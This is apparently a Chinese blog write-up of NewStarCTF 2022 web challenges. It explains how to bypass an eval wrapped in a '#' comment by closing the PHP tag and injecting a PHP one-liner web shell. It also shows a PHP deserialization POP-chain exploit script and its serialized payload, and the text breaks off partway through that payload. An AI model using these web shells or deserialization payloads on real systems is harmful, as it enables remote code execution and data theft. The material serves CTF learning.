{"title":"NewStarCTF2022公开赛-wp","uid":"8d801008e226a8eb98ad443ed169bddb","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","updated":"2023-08-06T08:01:55.254Z","comments":true,"path":"api/articles/2022NewStarCTF.json","keywords":null,"cover":"/img/40.jpg","content":"<p><code>没啥简介</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"NewStarCTF2022公开赛\"><a href=\"#NewStarCTF2022公开赛\" class=\"headerlink\" title=\"NewStarCTF2022公开赛\"></a>NewStarCTF2022公开赛</h1><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>\n<h2 id=\"1-NotPHP\"><a href=\"#1-NotPHP\" class=\"headerlink\" title=\"1.NotPHP\"></a>1.NotPHP</h2><pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"Welcome to CTF\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'key1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2077</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Hack Me\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Number error!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrong Key!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Pass it!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n</code></pre>\n<p>这里绕过不细讲，都是常见的</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>细讲这个</p>\n<p>这个是一个<code>eval</code>函数，但是里面其实已经被<code>#</code>给注释掉了，</p>\n<p>所以无论输入什么都没结果</p>\n<hr>\n<p>因此需要闭合或者绕过<code>#</code></p>\n<p>但是我试了很多闭合方式，结果都没反应</p>\n<p>最后发现</p>\n<pre><code>?&gt;\n</code></pre>\n<p>实现了语句闭合，</p>\n<p>但是，当把这个php结尾符加到后面时候，这个php就就结束了</p>\n<p>以</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>为例子</p>\n<pre class=\" language-html\"><code class=\"language-html\">url/xxx&amp;cmd=?>haha\n</code></pre>\n<p>当我们闭合了php代码后，那后面的<code>haha</code>的位置在哪里呢</p>\n<p><img src=\"/post/2022NewStarCTF/image-20220921083750913.png\" alt=\"image-20220921083750913\"></p>\n<p>我们可以看到，<code>haha</code>变成了<code>html</code>代码</p>\n<p>那么就可以操作了，</p>\n<p>比如xss，一句话🐎的插入等</p>\n<p>xss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）</p>\n<hr>\n<p>插入一句话🐎</p>\n<p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>\n<pre class=\" language-jsp\"><code class=\"language-jsp\"><script language=\"php\">@eval($_POST[\"cmd\"]);</script>\n</code></pre>\n<p>但是用蚁剑连不上</p>\n<p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span>\n</code></pre>\n<p>好家伙，传统思路，才是真</p>\n<p>连接成功拿到<code>flag</code></p>\n<hr>\n<p>不知道有没有看到这篇文章的同学看到这个<code>wp</code>，提醒一下，这里需要在<code>http body</code>里补充<code>num</code>请求信息</p>\n<p>因为这也是绕过的一个环节</p>\n<p><img src=\"/post/2022NewStarCTF/image-20220921084836402.png\" alt=\"image-20220921084836402\"></p>\n<hr>\n<h2 id=\"2-UnserializeOne\"><a href=\"#2-UnserializeOne\" class=\"headerlink\" title=\"2.UnserializeOne\"></a>2.UnserializeOne</h2><p>一道<code>popchain</code>，这还是我第一次做<code>popchain</code>类【惭愧，不过做着真有意思】</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token shell-comment comment\">#Something useful for you : https:</span><span class=\"token comment\" spellcheck=\"true\">//zhuanlan.zhihu.com/p/377676274</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Welcome to NewStarCTF, \"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sec</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"CTFers\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Easy</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cla</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fun</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">cla</span> <span class=\"token operator\">=</span> clone <span class=\"token variable\">$var</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">eeee</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>构造<code>pop</code>链主要在于，</p>\n<pre><code>把我们需要触发的魔术方法联系在一起，而且在联系触发过程中也要记得实例化目标类，这样才能调用和执行其中的方法\n</code></pre>\n<p>我们先中每个类其中的魔术方法列出来看看，再分析一下</p>\n<p><code>Start</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n     <span class=\"token comment\" spellcheck=\"true\">//__destruct()，对象被销毁时触发，也就是最后运行结束时触发</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Welcome to NewStarCTF, \"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span>\n      <span class=\"token comment\" spellcheck=\"true\">//这里进行echo $this->name，如果$this->name是一个类就会调用Sec()类里__toString()</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span>\n   <span class=\"token comment\" spellcheck=\"true\">//__isset()，当对不可访问属性调用isset()或empty()时调用</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\" spellcheck=\"true\">//这里把$this->func当作一个函数，执行$this->func()</span>\n        <span class=\"token comment\" spellcheck=\"true\">//如果$this->func不是一个正确的函数名，就会调用Sec类里__invoke()</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><code>Sec</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Sec</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\" spellcheck=\"true\">//__toString()，把类当做字符串时触发，</span>\n  <span class=\"token comment\" spellcheck=\"true\">//所以在Start类中的[echo \"Welcome to NewStarCTF, \".$this->name;]，就需要把name值赋值为Sec类名</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\" spellcheck=\"true\">//这里想调用this->obj的check方法</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"CTFers\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n     <span class=\"token comment\" spellcheck=\"true\">//__invoke()，当脚本尝试将对象调用为函数时触发</span>\n   <span class=\"token comment\" spellcheck=\"true\">//所以在Start类中的[$this->func)();]中，需要把func值赋值为Sec，从而把其当作函数执行时，从而触其魔术方法</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token comment\" spellcheck=\"true\">//这里就是目标，执行文件包含flag输出内容</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><code>Easy</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Easy</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cla</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fun</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span>\n   <span class=\"token comment\" spellcheck=\"true\">//__call()，在对象上下文中调用不可访问的方法时触发</span>\n   <span class=\"token comment\" spellcheck=\"true\">//所以在Sec类中，当this->obj赋值为Easy类时，调用check方法时，就会触发，因为Easy里没有check函数</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">cla</span> <span class=\"token operator\">=</span> clone <span class=\"token variable\">$var</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\" spellcheck=\"true\">//这里调用clone，当对象完成复制时会执行eeee里的__clone</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><code>eeee</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">eeee</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\" spellcheck=\"true\">//这里是对$this->obj的cmd属性使用isset函数，但是并不存在cmd属性</span>\n            <span class=\"token comment\" spellcheck=\"true\">//所以把this->obj赋值为Strat类名，从而触发__isset</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>整理一下</p>\n<pre><code>Start::__destruct\n\n==&gt;\n\nSec::__toString\n\n==&gt;\n\nEasy::__call\n\n==&gt;\n\neeee::__clone\n\n==&gt;\n\nStart::__isset\n\n==&gt;\n\nSec::__invoke\n</code></pre>\n<p>于是<code>payload</code>为</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token shell-comment comment\">#Something useful for you : https:</span><span class=\"token comment\" spellcheck=\"true\">//zhuanlan.zhihu.com/p/377676274</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Start</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sec</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Easy</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cla</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">eeee</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$start</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sec</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Sec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$easy</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Easy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$eeee</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">eeee</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$start</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$sec</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$start</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">func</span><span class=\"token operator\">=</span><span class=\"token variable\">$sec</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$sec</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">=</span><span class=\"token variable\">$easy</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sec</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token keyword\">var</span><span class=\"token operator\">=</span><span class=\"token variable\">$eeee</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$eeee</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">obj</span><span class=\"token operator\">=</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//因为这里把eeee里的变量复制为实例化的Start的类，所以如果从eeee类为开始序列化的入口也是可以的</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//echo serialize($eeee);</span>\n</code></pre>\n<p>得到序列化数据，<code>post</code>传入就行</p>\n<pre class=\" language-php\"><code class=\"language-php\">O<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Start\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">;</span>O<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Sec\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"obj\"</span><span class=\"token punctuation\">;</span>O<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Easy\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"cla\"</span><span class=\"token punctuation\">;</span>N<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token 